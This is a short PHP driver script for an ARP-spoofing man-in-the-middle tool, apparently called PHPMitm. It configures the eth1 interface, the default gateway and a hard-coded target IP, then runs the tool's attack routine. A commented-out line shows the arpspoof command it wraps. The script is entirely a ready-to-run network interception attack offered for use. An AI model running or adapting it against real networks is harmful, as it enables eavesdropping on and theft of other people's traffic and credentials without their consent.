#!/usr/bin/env php
<?php
/**
 * Description of PHPMitm
 *
 * @author Tony Baltazar <root@rubyninja.org>
 */
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA



require_once './PHPMitm.php';



$attack = new PHPMitm('eth1', false);
try {
    $attack->set_DefaultGateway();
    $attack->set_TargetMachine('10.128.129.147');
    $attack->sanity_checks();
    $attack->initial_attack_prep();
    $attack->attack();
} catch(PHPMitm_Exception $e) {
    die ($e->getMessage());
}




//echo 'running: arpspoof -i ' . $attack->get_NetworkInterface() . ' -t ' . $attack->get_DefaultGateway() . ' ' . $attack->get_TargetMachine() . "\n";



?>
